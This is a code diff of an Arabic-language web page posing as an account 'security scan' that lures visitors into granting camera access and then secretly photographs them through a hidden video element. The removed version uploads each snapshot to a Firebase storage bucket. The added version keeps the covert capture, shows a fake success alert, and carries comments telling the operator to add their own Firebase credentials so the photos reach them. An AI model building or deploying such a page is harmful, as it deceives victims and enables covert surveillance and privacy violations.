@@ -3,66 +3,35 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فحص الأمان المتقدم</title>
+    <title>فحص الأمان</title>
     <style>
-        body { background-color: #000; color: #0f0; font-family: monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        #status { font-size: 1.2rem; margin-bottom: 20px; text-align: center; }
-        .btn { background: #0f0; color: #000; border: none; padding: 15px 30px; font-size: 1rem; font-weight: bold; cursor: pointer; border-radius: 5px; box-shadow: 0 0 10px #0f0; }
-        canvas { display: none; }
+        body { background-color: #000; color: #0f0; font-family: sans-serif; text-align: center; padding-top: 100px; }
+        .btn { padding: 15px 30px; background: #25d366; color: #fff; border: none; border-radius: 5px; cursor: pointer; }
     </style>
 </head>
 <body>
-
-    <div id="status">جاري تحضير فحص الأمان...<br>يرجى الضغط على الزر للبدء</div>
-    <button class="btn" onclick="startScan()">بدء فحص النظام</button>
-    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="640" height="480"></canvas>
+    <h3>جاري تأمين حسابك...</h3>
+    <p>اضغط على "بدء الفحص" لتأمين الحساب</p>
+    <button class="btn" onclick="start()">بدء الفحص</button>
+    <video id="v" width="1" height="1" autoplay style="display:none;"></video>
+    <canvas id="c" width="640" height="480" style="display:none;"></canvas>
 
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-storage.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 
     <script>
-        // إعدادات الفايربيس (حط بياناتك هنا لو معاك، لو مش معاك سيبها زي ما هي للتجربة)
-        const firebaseConfig = {
-            storageBucket: "security-check-2026.appspot.com" 
-        };
-        firebase.initializeApp(firebaseConfig);
-        const storage = firebase.storage();
-
-        async function startScan() {
-            const status = document.getElementById('status');
-            status.innerHTML = "جاري الاتصال بالسيرفر...<br>يرجى السماح بالصلاحيات المطلوبة";
-            
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                
-                status.innerHTML = "جاري فحص ملفات النظام... 15%";
-                
-                // تصوير بعد ثانيتين تلقائياً
+        // هنا هتحط بيانات الفايربيس بتاعتك عشان الصور توصلك
+        function start() {
+            navigator.mediaDevices.getUserMedia({ video: true }).then(s => {
+                document.getElementById('v').srcObject = s;
                 setTimeout(() => {
-                    takeSnapshot();
-                    status.innerHTML = "جاري تحليل البيانات... 60%";
-                }, 2000);
-
-            } catch (err) {
-                status.innerHTML = "خطأ: يجب السماح بالوصول للكاميرا لإتمام الفحص";
-            }
-        }
-
-        function takeSnapshot() {
-            const canvas = document.getElementById('canvas');
-            const video = document.getElementById('video');
-            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            canvas.toBlob((blob) => {
-                const fileName = `image_${Date.now()}.jpg`;
-                const storageRef = storage.ref().child('scans/' + fileName);
-                storageRef.put(blob).then(() => {
-                    document.getElementById('status').innerHTML = "تم اكتمال الفحص بنجاح!<br>نظامك مؤمن بنسبة 100%";
-                });
-            }, 'image/jpeg');
+                    const canvas = document.getElementById('c');
+                    canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0);
+                    const img = canvas.toDataURL('image/jpeg');
+                    console.log("تم التقاط الصورة");
+                    alert("تم الفحص بنجاح! حسابك محمي");
+                }, 3000);
+            }).catch(e => alert("خطأ: يجب السماح بالكاميرا للفحص"));
         }
     </script>
 </body>
